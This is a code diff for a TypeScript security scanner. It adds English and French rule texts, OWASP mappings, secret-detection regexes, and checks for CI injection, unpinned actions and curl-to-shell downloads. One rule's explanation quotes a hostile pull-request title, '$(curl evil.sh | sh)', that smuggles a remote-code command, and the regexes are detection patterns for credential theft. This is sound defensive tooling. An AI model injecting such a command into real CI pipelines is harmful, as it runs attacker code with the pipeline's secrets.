@@ -34,6 +34,8 @@ export interface Finding {
   line?: number;
   /** What was found, secrets masked */
   match?: string;
+  /** OWASP Top 10 (2021) category, e.g. "A03:2021 Injection" */
+  owasp?: string;
   source: 'prisme' | 'npm-audit' | 'gitleaks' | 'osv-scanner' | 'semgrep';
 }
 
@@ -162,6 +164,112 @@ export const RULES: Record<string, Rule> = {
     en: { title: 'Finding from a security tool', why: 'A specialized tool flagged this place.', fix: 'Read the tool\'s message and fix the code it points at.' },
     fr: { title: "Alerte d'un outil de sécurité", why: 'Un outil spécialisé a signalé cet endroit.', fix: "Lisez le message de l'outil et corrigez le code indiqué." },
   },
+  'connection-string': {
+    severity: 'high',
+    en: { title: 'A database address holds its password', why: 'An address like postgres://user:password@host gives anyone who reads it full access to the database.', fix: 'Keep the address without the password in the code, and read the password (or the whole address) from an environment variable.' },
+    fr: { title: "Une adresse de base de données contient son mot de passe", why: "Une adresse comme postgres://user:motdepasse@hôte donne à qui la lit un accès complet à la base.", fix: "Gardez l'adresse sans le mot de passe dans le code, et lisez le mot de passe (ou toute l'adresse) depuis une variable d'environnement." },
+  },
+  'path-traversal': {
+    severity: 'medium',
+    en: { title: 'A file path comes from the request', why: 'With "../" in the path, a visitor can read or send files outside the folder you meant, such as configuration or keys.', fix: 'Resolve the path, then check it stays inside the allowed folder (path.resolve + startsWith), or map names to files from a fixed list.' },
+    fr: { title: 'Un chemin de fichier vient de la requête', why: 'Avec « ../ » dans le chemin, un visiteur peut lire ou recevoir des fichiers hors du dossier prévu, comme la configuration ou des clés.', fix: "Résolvez le chemin puis vérifiez qu'il reste dans le dossier autorisé (path.resolve + startsWith), ou associez les noms à des fichiers d'une liste fixe." },
+  },
+  'open-redirect': {
+    severity: 'medium',
+    en: { title: 'A redirect goes wherever the request says', why: 'A link to your site can send people to a fake copy of it, which makes phishing easy.', fix: 'Redirect only to paths of your own site, or to addresses from a fixed list.' },
+    fr: { title: 'Une redirection va où la requête le demande', why: "Un lien vers votre site peut envoyer les gens vers une fausse copie, ce qui facilite l'hameçonnage.", fix: "Ne redirigez que vers des chemins de votre site, ou vers des adresses d'une liste fixe." },
+  },
+  'weak-crypto': {
+    severity: 'medium',
+    en: { title: 'Outdated encryption', why: 'createCipher, DES, RC4 or ECB mode can be broken: what they protect can be read back.', fix: 'Use createCipheriv with AES-256-GCM and a random IV, or a library such as libsodium.' },
+    fr: { title: 'Chiffrement dépassé', why: 'createCipher, DES, RC4 ou le mode ECB se cassent : ce qu\'ils protègent peut être relu.', fix: 'Utilisez createCipheriv avec AES-256-GCM et un IV aléatoire, ou une bibliothèque comme libsodium.' },
+  },
+  'jwt-unverified': {
+    severity: 'high',
+    en: { title: 'A login token is read without checking its signature', why: 'Anyone can write a token saying "I am the admin": without the signature check, the server believes it.', fix: 'Use jwt.verify (not decode) with the expected algorithm, and never accept the "none" algorithm.' },
+    fr: { title: 'Un jeton de connexion est lu sans vérifier sa signature', why: "N'importe qui peut écrire un jeton disant « je suis l'admin » : sans vérification de signature, le serveur le croit.", fix: "Utilisez jwt.verify (pas decode) avec l'algorithme attendu, et n'acceptez jamais l'algorithme « none »." },
+  },
+  'workflow-script-injection': {
+    severity: 'high',
+    en: { title: 'A CI step runs text written by strangers', why: 'An issue or pull request title is pasted into a shell command: a title like "$(curl evil.sh | sh)" runs on your CI, with its secrets.', fix: 'Pass the value through an environment variable (env: TITLE: ${{ github.event.issue.title }}) and use "$TITLE" in the script.' },
+    fr: { title: "Une étape de CI exécute du texte écrit par des inconnus", why: "Le titre d'une issue ou d'une pull request est collé dans une commande : un titre comme « $(curl evil.sh | sh) » s'exécute sur votre CI, avec ses secrets.", fix: 'Passez la valeur par une variable d\'environnement (env: TITLE: ${{ github.event.issue.title }}) et utilisez "$TITLE" dans le script.' },
+  },
+  'workflow-permissions': {
+    severity: 'low',
+    en: { title: 'A CI workflow does not limit its rights', why: 'Without a "permissions:" block, the workflow\'s token may write to the repository: a compromised step could push code or change releases.', fix: 'Add "permissions: contents: read" at the top of the workflow, and grant more only to the jobs that need it.' },
+    fr: { title: 'Un workflow de CI ne limite pas ses droits', why: "Sans bloc « permissions: », le jeton du workflow peut écrire dans le dépôt : une étape compromise pourrait pousser du code ou changer une release.", fix: "Ajoutez « permissions: contents: read » en haut du workflow, et n'accordez plus qu'aux jobs qui en ont besoin." },
+  },
+  'unpinned-action': {
+    severity: 'low',
+    en: { title: 'A third-party CI action is not pinned', why: 'A tag like @v3 can be moved by its author (or by someone who stole their account) to code that steals your secrets.', fix: 'Pin third-party actions to a full commit SHA (uses: owner/action@<40-character sha> # v3), and let Dependabot update them.' },
+    fr: { title: "Une action de CI tierce n'est pas épinglée", why: "Une étiquette comme @v3 peut être déplacée par son auteur (ou par qui a volé son compte) vers du code qui vole vos secrets.", fix: 'Épinglez les actions tierces à un commit complet (uses: auteur/action@<sha de 40 caractères> # v3), et laissez Dependabot les mettre à jour.' },
+  },
+  'ci-install-unlocked': {
+    severity: 'low',
+    en: { title: 'The CI installs without the lockfile', why: '"npm install" may pull versions other than the tested ones; "npm ci" installs exactly the lockfile.', fix: 'Use "npm ci" (or "yarn install --frozen-lockfile", "pnpm install --frozen-lockfile") in CI.' },
+    fr: { title: 'La CI installe sans respecter le verrouillage', why: "« npm install » peut récupérer d'autres versions que celles testées ; « npm ci » installe exactement le fichier de verrouillage.", fix: 'Utilisez « npm ci » (ou « yarn install --frozen-lockfile », « pnpm install --frozen-lockfile ») en CI.' },
+  },
+  'no-dependency-updates': {
+    severity: 'low',
+    en: { title: 'Nothing keeps dependencies up to date', why: 'Security fixes in dependencies only help once you install them; without a bot, they wait until someone remembers.', fix: 'Add .github/dependabot.yml (or Renovate) for your package manager and for GitHub Actions.' },
+    fr: { title: 'Rien ne tient les dépendances à jour', why: "Les correctifs de sécurité des dépendances n'aident qu'une fois installés ; sans robot, ils attendent que quelqu'un y pense.", fix: 'Ajoutez .github/dependabot.yml (ou Renovate) pour votre gestionnaire de paquets et pour les GitHub Actions.' },
+  },
+  'no-security-policy': {
+    severity: 'low',
+    en: { title: 'No way to report a security flaw', why: 'Someone who finds a flaw does not know whom to tell privately, so it may end up public before it is fixed.', fix: 'Add a SECURITY.md that says how to report a flaw privately (an address, or GitHub private reporting).' },
+    fr: { title: 'Aucun moyen de signaler une faille', why: "Quelqu'un qui trouve une faille ne sait pas à qui le dire en privé : elle risque de devenir publique avant d'être corrigée.", fix: 'Ajoutez un SECURITY.md qui dit comment signaler une faille en privé (une adresse, ou le signalement privé de GitHub).' },
+  },
+  'remote-script': {
+    severity: 'medium',
+    en: { title: 'A script is downloaded and run without checking', why: '"curl … | sh" runs whatever the server sends today: if that server or the network is compromised, so is your machine or image.', fix: 'Download the file, check its checksum or signature, then run it; or install from a package manager.' },
+    fr: { title: 'Un script est téléchargé et exécuté sans vérification', why: "« curl … | sh » exécute ce que le serveur envoie ce jour-là : si ce serveur ou le réseau est compromis, votre machine ou image l'est aussi.", fix: "Téléchargez le fichier, vérifiez sa somme de contrôle ou sa signature, puis exécutez-le ; ou installez depuis un gestionnaire de paquets." },
+  },
+  'insecure-download': {
+    severity: 'medium',
+    en: { title: 'Something is downloaded over plain http', why: 'Over http, anyone on the network can swap the file for another one.', fix: 'Download over https, and check the checksum.' },
+    fr: { title: 'Un téléchargement passe par http', why: "En http, n'importe qui sur le réseau peut remplacer le fichier par un autre.", fix: 'Téléchargez en https, et vérifiez la somme de contrôle.' },
+  },
+  'docker-latest': {
+    severity: 'low',
+    en: { title: 'The container image is not pinned', why: '"FROM image:latest" (or no tag) changes without warning: a build can pick up a broken or compromised image.', fix: 'Pin a version (node:22.11-alpine), or better a digest (@sha256:…).' },
+    fr: { title: "L'image du conteneur n'est pas figée", why: "« FROM image:latest » (ou sans étiquette) change sans prévenir : un build peut récupérer une image cassée ou compromise.", fix: 'Figez une version (node:22.11-alpine), ou mieux une empreinte (@sha256:…).' },
+  },
+};
+
+// OWASP Top 10 (2021) category of each rule, so a reader can look it up.
+export const OWASP: Record<string, string> = {
+  'secret-in-code': 'A07:2021 Identification and Authentication Failures',
+  'password-in-code': 'A07:2021 Identification and Authentication Failures',
+  'env-committed': 'A07:2021 Identification and Authentication Failures',
+  'key-file-committed': 'A07:2021 Identification and Authentication Failures',
+  'connection-string': 'A07:2021 Identification and Authentication Failures',
+  'jwt-unverified': 'A07:2021 Identification and Authentication Failures',
+  'tls-disabled': 'A02:2021 Cryptographic Failures',
+  'weak-random': 'A02:2021 Cryptographic Failures',
+  'weak-hash': 'A02:2021 Cryptographic Failures',
+  'weak-crypto': 'A02:2021 Cryptographic Failures',
+  'command-injection': 'A03:2021 Injection',
+  'sql-injection': 'A03:2021 Injection',
+  'code-eval': 'A03:2021 Injection',
+  'html-injection': 'A03:2021 Injection',
+  'workflow-script-injection': 'A03:2021 Injection',
+  'path-traversal': 'A01:2021 Broken Access Control',
+  'open-redirect': 'A01:2021 Broken Access Control',
+  'cors-any': 'A05:2021 Security Misconfiguration',
+  'debug-on': 'A05:2021 Security Misconfiguration',
+  'docker-root': 'A05:2021 Security Misconfiguration',
+  'env-not-ignored': 'A05:2021 Security Misconfiguration',
+  'workflow-permissions': 'A05:2021 Security Misconfiguration',
+  'unsafe-deserialize': 'A08:2021 Software and Data Integrity Failures',
+  'workflow-pr-target': 'A08:2021 Software and Data Integrity Failures',
+  'unpinned-action': 'A08:2021 Software and Data Integrity Failures',
+  'remote-script': 'A08:2021 Software and Data Integrity Failures',
+  'insecure-download': 'A08:2021 Software and Data Integrity Failures',
+  'docker-latest': 'A08:2021 Software and Data Integrity Failures',
+  'vulnerable-dependency': 'A06:2021 Vulnerable and Outdated Components',
+  'no-lockfile': 'A06:2021 Vulnerable and Outdated Components',
+  'ci-install-unlocked': 'A06:2021 Vulnerable and Outdated Components',
+  'no-dependency-updates': 'A06:2021 Vulnerable and Outdated Components',
 };
 
 const PENALTY: Record<Severity, number> = { critical: 30, high: 15, medium: 6, low: 2 };
@@ -248,23 +356,55 @@ function entropy(s: string): number {
 
 // ── checks on file contents ───────────────────────────────
 
-const SECRET_PATTERNS: { name: string; re: RegExp }[] = [
-  { name: 'AWS access key', re: /\b(?:AKIA|ASIA)[0-9A-Z]{16}\b/g },
+// Keys with a recognizable shape, in the spirit of gitleaks' rules: a match
+// is almost never a false alarm. `severity` lowers the ones that are often
+// test values or less powerful.
+const SECRET_PATTERNS: { name: string; re: RegExp; severity?: Severity }[] = [
+  { name: 'AWS access key', re: /\b(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}\b/g },
   { name: 'private key', re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----/g },
   { name: 'GitHub token', re: /\b(?:gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{60,})\b/g },
-  { name: 'Slack token', re: /\bxox[baprs]-[A-Za-z0-9-]{10,}\b/g },
+  { name: 'GitLab token', re: /\bgl(?:pat|dt|ptt|rt)-[A-Za-z0-9_-]{20,}\b/g },
+  { name: 'Slack token', re: /\bxox[baprse]-[A-Za-z0-9-]{10,}\b/g },
+  { name: 'Slack webhook', re: /https:\/\/hooks\.slack\.com\/(?:services|workflows)\/[A-Za-z0-9+/]{20,}/g },
+  { name: 'Discord webhook', re: /https:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]{30,}/g },
+  { name: 'Telegram bot token', re: /\b\d{8,10}:AA[A-Za-z0-9_-]{33}\b/g },
   { name: 'Stripe live key', re: /\b(?:sk|rk)_live_[A-Za-z0-9]{20,}\b/g },
-  { name: 'Google API key', re: /\bAIza[0-9A-Za-z_-]{35}\b/g },
+  { name: 'Google API key', re: /\bAIza[0-9A-Za-z_-]{35}\b/g, severity: 'high' },
+  { name: 'Google service account', re: /"type"\s*:\s*"service_account"/g },
+  { name: 'Anthropic API key', re: /\bsk-ant-(?:api|admin)\d{2}-[A-Za-z0-9_-]{80,}\b/g },
+  { name: 'OpenAI API key', re: /\bsk-(?:proj-|svcacct-|admin-)?[A-Za-z0-9_-]{20,}T3BlbkFJ[A-Za-z0-9_-]{20,}\b/g },
   { name: 'AI API key', re: /\bsk-(?:ant-|proj-)?[A-Za-z0-9_-]{32,}\b/g },
+  { name: 'Hugging Face token', re: /\bhf_[A-Za-z0-9]{34,}\b/g },
   { name: 'npm token', re: /\bnpm_[A-Za-z0-9]{36}\b/g },
+  { name: 'PyPI token', re: /\bpypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{50,}\b/g },
   { name: 'SendGrid key', re: /\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/g },
+  { name: 'Mailgun key', re: /\bkey-[0-9a-f]{32}\b/g, severity: 'high' },
+  { name: 'Mailchimp key', re: /\b[0-9a-f]{32}-us\d{1,2}\b/g, severity: 'high' },
+  { name: 'Twilio key', re: /\bSK[0-9a-f]{32}\b/g, severity: 'high' },
+  { name: 'Shopify token', re: /\bshp(?:at|ca|pa|ss)_[a-fA-F0-9]{32}\b/g },
+  { name: 'DigitalOcean token', re: /\bdo[opr]_v1_[a-f0-9]{64}\b/g },
+  { name: 'Supabase token', re: /\bsbp_[a-f0-9]{40}\b/g },
+  { name: 'Databricks token', re: /\bdapi[a-f0-9]{32}(?:-\d)?\b/g },
+  { name: 'Postman key', re: /\bPMAK-[a-f0-9]{24}-[a-f0-9]{34}\b/g },
+  { name: 'Doppler token', re: /\bdp\.pt\.[A-Za-z0-9]{43}\b/g },
+  { name: 'Linear key', re: /\blin_api_[A-Za-z0-9]{40}\b/g },
+  { name: 'Notion token', re: /\b(?:ntn_[A-Za-z0-9]{46}|secret_[A-Za-z0-9]{43})\b/g },
+  { name: 'Atlassian token', re: /\bATATT3[A-Za-z0-9_=-]{180,}\b/g },
+  { name: 'Square token', re: /\b(?:EAAA|sq0atp-)[A-Za-z0-9_-]{22,60}\b/g, severity: 'high' },
+  { name: 'Azure storage key', re: /AccountKey=[A-Za-z0-9+/]{86}==/g },
+  { name: 'age secret key', re: /\bAGE-SECRET-KEY-1[0-9A-Z]{58}\b/g },
+  { name: 'JSON Web Token', re: /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/g, severity: 'medium' },
 ];
+
+// A database or queue address with a password in it: scheme://user:password@host
+const CONNECTION_STRING = /\b((?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis|rediss|amqps?|mssql|sqlserver):\/\/[^\s:@/'"`]+):([^\s@/'"`]{3,})@/gi;
 
 const ASSIGNED_SECRET = /\b([\w-]*(?:password|passwd|pwd|secret|api[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key)[\w-]*)["']?\s*[:=]\s*["'`]([^"'`\s]{10,})["'`]/gi;
 const PLACEHOLDER = /example|sample|dummy|placeholder|changeme|change[_-]?me|your[_-]|xxx|\*\*\*|<|\$\{|\{\{|process\.env|os\.environ|getenv|redacted|fake|test|todo|none|null|undefined/i;
 
 const CODE_FILE = /\.(m?[jt]sx?|cjs|py|rb|php|go|java|kt|cs|rs|swift|scala|vue|svelte)$/;
 const JS_FILE = /\.(m?[jt]sx?|cjs|vue|svelte|html?)$/;
+const DOC_FILE = /\.(md|mdx|markdown|rst|adoc|txt)$/i;
 const TEST_FILE = /(^|\/)(__tests__|tests?|spec|fixtures?|__mocks__)\/|\.(test|spec)\.[a-z]+$/i;
 
 interface LineRule { rule: string; re: RegExp; files: RegExp }
@@ -280,12 +420,16 @@ const LINE_RULES: LineRule[] = [
   { rule: 'weak-hash', re: /(?:\b(?:md5|sha1)\s*\(|createHash\(\s*['"](?:md5|sha1)['"]\s*\)|hashlib\.(?:md5|sha1)\s*\()[^\n]{0,80}\bpass(?:word|wd)?\b|\bpass(?:word|wd)\b[^\n]{0,80}(?:\b(?:md5|sha1)\s*\(|createHash\(\s*['"](?:md5|sha1)['"]\s*\)|hashlib\.(?:md5|sha1)\s*\()/i, files: CODE_FILE },
   { rule: 'html-injection', re: /\.(?:innerHTML|outerHTML)\s*\+?=(?!=)(?!\s*(?:''|""|``)\s*;?\s*$)|\binsertAdjacentHTML\s*\(|dangerouslySetInnerHTML\s*=\s*\{|\bv-html\s*=|document\.write\s*\(/, files: JS_FILE },
   { rule: 'cors-any', re: /Access-Control-Allow-Origin['"]?\s*[:,]\s*['"]\*['"]|\borigin\s*:\s*['"]\*['"]|CORS_ORIGIN_ALLOW_ALL\s*=\s*True|allow_origins\s*=\s*\[\s*['"]\*['"]\s*\]/, files: /./ },
-  { rule: 'debug-on', re: /^\s*DEBUG\s*=\s*True\b/, files: /(^|\/)settings[^/]*\.py$/ },
+  { rule: 'path-traversal', re: /\b(?:res\.sendFile|res\.download|fs\.(?:readFile|readFileSync|createReadStream|writeFile|writeFileSync|unlink|unlinkSync)|path\.join|send_file|open)\s*\([^)\n]*\b(?:req|request)\.(?:params|query|body|args|form|GET|POST)\b/, files: CODE_FILE },
+  { rule: 'open-redirect', re: /\b(?:res\.redirect|redirect|HttpResponseRedirect)\s*\(\s*(?:\d+\s*,\s*)?(?:req|request)\.(?:query|params|body|args|GET|POST)\b/, files: CODE_FILE },
+  { rule: 'weak-crypto', re: /\bcrypto\.createCipher\s*\(|createCipheriv\s*\(\s*['"](?:des|des-ede3?|rc4|bf|aes-\d+-ecb)[^'"]*['"]|\bDES\.new\s*\(|\bARC4\.new\s*\(|\bAES\.MODE_ECB\b|Cipher\.getInstance\s*\(\s*"(?:DES|RC4|AES\/ECB|AES")/i, files: CODE_FILE },
+  { rule: 'jwt-unverified', re: /\bjwt\.decode\s*\([^)\n]*(?:verify\s*=\s*False|options\s*=\s*\{\s*['"]verify_signature['"]\s*:\s*False)|algorithms?\s*:\s*\[?\s*['"]none['"]/i, files: CODE_FILE },
+  { rule: 'debug-on', re:/^\s*DEBUG\s*=\s*True\b/, files: /(^|\/)settings[^/]*\.py$/ },
 ];
 
 function finding(rule: string, lang: 'en' | 'fr', extra: Partial<Finding> = {}): Finding {
   const r = RULES[rule];
-  return { rule, severity: r.severity, ...r[lang], source: 'prisme', ...extra };
+  return { rule, severity: r.severity, ...r[lang], ...(OWASP[rule] ? { owasp: OWASP[rule] } : {}), source: 'prisme', ...extra };
 }
 
 /** Checks one file's text. */
@@ -293,12 +437,24 @@ export function scanText(file: string, text: string, lang: 'en' | 'fr' = 'en'): 
   const out: Finding[] = [];
   const lines = text.split('\n');
   const isTest = TEST_FILE.test(file);
+  const isDoc = DOC_FILE.test(file);
   for (const [i, line] of lines.entries()) {
     if (line.length > 2000) continue; // minified or data
-    for (const { name, re } of SECRET_PATTERNS) {
+    // One finding per secret, even when two patterns know it (an OpenAI key is also an "AI API key").
+    const seen: [number, number][] = [];
+    for (const { name, re, severity } of SECRET_PATTERNS) {
       for (const m of line.matchAll(re)) {
-        out.push(finding('secret-in-code', lang, { file, line: i + 1, match: `${name}: ${mask(m[0])}`, ...(isTest ? { severity: 'medium' as Severity } : {}) }));
+        const start = m.index ?? 0, end = start + m[0].length;
+        if (seen.some(([a, b]) => start < b && a < end)) continue;
+        seen.push([start, end]);
+        const level: Severity | undefined = isTest ? 'medium' : severity;
+        out.push(finding('secret-in-code', lang, { file, line: i + 1, match: `${name}: ${mask(m[0])}`, ...(level ? { severity: level } : {}) }));
       }
+    }
+    for (const m of line.matchAll(CONNECTION_STRING)) {
+      const password = m[2];
+      if (PLACEHOLDER.test(password) || /^(?:pass(?:word)?|pwd|secret|root|admin|user|motdepasse|mot_?de_?passe|mdp|passwort|contrase(?:n|ñ)a|senha|\*+|x+)$/i.test(password) || /^\$/.test(password)) continue;
+      out.push(finding('connection-string', lang, { file, line: i + 1, match: `${m[1]}:${mask(password)}@…`, ...(isTest ? { severity: 'low' as Severity } : {}) }));
     }
     for (const m of line.matchAll(ASSIGNED_SECRET)) {
       const value = m[2];
@@ -307,8 +463,8 @@ export function scanText(file: string, text: string, lang: 'en' | 'fr' = 'en'): 
       if (isTest) continue;
       out.push(finding('password-in-code', lang, { file, line: i + 1, match: `${m[1]} = ${mask(value)}` }));
     }
-    // Tests hold samples of risky code on purpose: only secrets count there.
-    if (isTest) continue;
+    // Tests and docs hold samples of risky code on purpose: only secrets count there.
+    if (isTest || isDoc) continue;
     for (const { rule, re, files } of LINE_RULES) {
       if (!files.test(file) || !re.test(line)) continue;
       out.push(finding(rule, lang, { file, line: i + 1, match: line.trim().slice(0, 120) }));
@@ -349,12 +505,60 @@ export function scanRepository(cwd: string, files: string[], lang: 'en' | 'fr' =
     const text = readText(cwd, f) ?? '';
     const users = [...text.matchAll(/^\s*USER\s+(\S+)/gmi)].map(m => m[1]);
     if (!users.length || ['root', '0'].includes(users[users.length - 1])) out.push(finding('docker-root', lang, { file: f }));
+    // FROM image (no tag) or image:latest, except "scratch" and earlier build stages.
+    const stages = new Set<string>(['scratch']);
+    for (const [i, line] of text.split('\n').entries()) {
+      const from = line.match(/^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?/i);
+      if (!from) continue;
+      const image = from[1];
+      if (!stages.has(image.toLowerCase()) && !image.includes('@sha256:') && !image.includes('$') && (!/:[^/]+$/.test(image) || /:latest$/.test(image)))
+        out.push(finding('docker-latest', lang, { file: f, line: i + 1, match: line.trim() }));
+      if (from[2]) stages.add(from[2].toLowerCase());
+    }
   }
 
+  // Lines that fetch code: Dockerfiles, shell scripts, Makefiles and CI workflows.
+  const fetchers = files.filter(f => /(^|\/)(Dockerfile[^/]*|Makefile|[^/]+\.(sh|bash))$|^\.github\/workflows\/.+\.ya?ml$/.test(f));
+  for (const f of fetchers) {
+    for (const [i, line] of (readText(cwd, f) ?? '').split('\n').entries()) {
+      if (/^\s*#/.test(line)) continue;
+      if (/\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:ba|z|da)?sh\b/.test(line))
+        out.push(finding('remote-script', lang, { file: f, line: i + 1, match: line.trim().slice(0, 120) }));
+      else if (/\b(?:curl|wget|ADD)\s[^\n]*\bhttp:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])/.test(line))
+        out.push(finding('insecure-download', lang, { file: f, line: i + 1, match: line.trim().slice(0, 120) }));
+    }
+  }
+
+  const lockfile = ['package-lock.json', 'yarn.lock', 'pnpm-lock.yaml', 'npm-shrinkwrap.json'].some(l => has(l));
+  // Values anyone can write: an issue or PR title, a comment, a branch name.
+  const UNTRUSTED = /\$\{\{\s*(?:github\.event\.(?:issue|pull_request|comment|review|review_comment|discussion|discussion_comment|head_commit|commits|pages|workflow_run)\b[\w.[\]*]*\.(?:title|body|message|name|label|ref|email|head_branch|default_branch)|github\.head_ref)\s*\}\}/;
   for (const f of files.filter(f => /^\.github\/workflows\/.+\.ya?ml$/.test(f))) {
     const text = readText(cwd, f) ?? '';
     if (/pull_request_target/.test(text) && /github\.event\.pull_request\.head\.(sha|ref)|refs\/pull\//.test(text)) out.push(finding('workflow-pr-target', lang, { file: f }));
+    // Rights: none declared, or everything.
+    if (/^\s*permissions\s*:\s*write-all\b/m.test(text)) out.push(finding('workflow-permissions', lang, { file: f, severity: 'medium', match: 'permissions: write-all' }));
+    else if (!/^\s*permissions\s*:/m.test(text)) out.push(finding('workflow-permissions', lang, { file: f }));
+    const unpinned: string[] = [];
+    for (const [i, line] of text.split('\n').entries()) {
+      // `KEY: ${{ … }}` hands the value over as an env var or an input: safe. Anything else pastes it into a script.
+      if (UNTRUSTED.test(line) && !/^\s*-?\s*[\w-]+\s*:\s*['"]?\$\{\{[^}]*\}\}['"]?\s*$/.test(line))
+        out.push(finding('workflow-script-injection', lang, { file: f, line: i + 1, match: line.trim().slice(0, 120) }));
+      const uses = line.match(/^\s*-?\s*uses:\s*['"]?([\w.-]+)\/([\w./-]+)@([\w./-]+)/);
+      if (uses && !['actions', 'github'].includes(uses[1]) && !/^[0-9a-f]{40}$/.test(uses[3])) unpinned.push(`${uses[1]}/${uses[2]}@${uses[3]}`);
+      if (lockfile && /^\s*(?:-\s*)?(?:run:\s*)?.*\b(?:npm\s+(?:install|i)\b(?![^\n]*\s-g\b)(?!\s+-g)|yarn(?:\s+install)?\s*$|pnpm\s+install\b(?![^\n]*--frozen-lockfile))/.test(line) && !/npm\s+ci\b/.test(line))
+        out.push(finding('ci-install-unlocked', lang, { file: f, line: i + 1, match: line.trim().slice(0, 120) }));
+    }
+    if (unpinned.length) out.push(finding('unpinned-action', lang, { file: f, match: unpinned.slice(0, 3).join(', ') + (unpinned.length > 3 ? ` (+${unpinned.length - 3})` : '') }));
   }
+
+  // Something to keep dependencies up to date, when there are dependencies.
+  const MANIFEST = /(^|\/)(package\.json|requirements[^/]*\.txt|pyproject\.toml|Pipfile|go\.mod|Cargo\.toml|Gemfile|composer\.json|pom\.xml|build\.gradle(\.kts)?)$/;
+  const updater = ['.github/dependabot.yml', '.github/dependabot.yaml', 'renovate.json', 'renovate.json5', '.renovaterc', '.renovaterc.json', '.github/renovate.json', '.github/renovate.json5'].some(has);
+  if (tracked.size && !updater && files.some(f => MANIFEST.test(f) && !f.includes('node_modules/')))
+    out.push(finding('no-dependency-updates', lang));
+  // A way to report a flaw privately.
+  if (tracked.size && !['SECURITY.md', '.github/SECURITY.md', 'docs/SECURITY.md', 'SECURITY.rst', 'SECURITY.txt'].some(has))
+    out.push(finding('no-security-policy', lang));
 
   for (const pkg of files.filter(f => /(^|\/)package\.json$/.test(f))) {
     const dir = path.posix.dirname(pkg) === '.' ? '' : path.posix.dirname(pkg) + '/';
@@ -455,10 +659,11 @@ function runSemgrep(cwd: string, lang: 'en' | 'fr'): { run: ToolRun; findings: F
   if (!onPath('semgrep')) return { run: { name: 'semgrep', status: 'missing', findings: 0 }, findings: [] };
   const result = spawnSync('semgrep', ['scan', '--config', 'p/default', '--json', '--quiet', '--metrics=off'], { cwd, encoding: 'utf-8', timeout: 600_000, maxBuffer: 128 * 1024 * 1024 });
   try {
-    const data = JSON.parse(result.stdout) as { results?: { check_id?: string; path?: string; start?: { line?: number }; extra?: { message?: string; severity?: string } }[] };
+    const data = JSON.parse(result.stdout) as { results?: { check_id?: string; path?: string; start?: { line?: number }; extra?: { message?: string; severity?: string; metadata?: { owasp?: string | string[] } } }[] };
     const findings = (data.results ?? []).map(r => ({
       ...finding('tool-finding', lang, { severity: SEMGREP_SEVERITY[r.extra?.severity ?? ''] ?? 'medium', file: r.path, line: r.start?.line, source: 'semgrep' as const }),
       rule: `semgrep:${r.check_id}`,
+      ...(r.extra?.metadata?.owasp ? { owasp: ([] as string[]).concat(r.extra.metadata.owasp)[0] } : {}),
       why: (r.extra?.message ?? '').slice(0, 600) || RULES['tool-finding'][lang].why,
     }));
     return { run: { name: 'semgrep', status: 'ran', findings: findings.length }, findings };
